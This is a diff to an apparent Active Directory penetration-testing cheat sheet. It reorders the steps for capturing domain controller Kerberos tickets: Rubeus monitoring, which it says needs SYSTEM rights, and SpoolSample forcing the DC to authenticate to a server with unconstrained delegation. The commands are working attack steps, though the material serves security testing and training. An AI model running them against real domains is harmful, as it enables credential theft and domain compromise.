@@ -502,10 +502,15 @@ spoolerscan.ps1
 ls \\<DC>\pipe\spoolss
 ```
 
-#### Force authentication of the DC
-- Listen with Rubeus and force the DC to authenticate to the server
+#### Listen with rubeus for incoming tickets
+- Requires running as system!
+- https://powershell-guru.com/powershell-tip-53-run-powershell-as-system/
 ```
 .\rubeus.exe monitor /interval:5
+```
+
+#### Force authentication of the DC
+```
 .\SpoolSample.exe \\<DC NAME> \\<TARGET SERVER WITH DELEGATION>
 ```
 
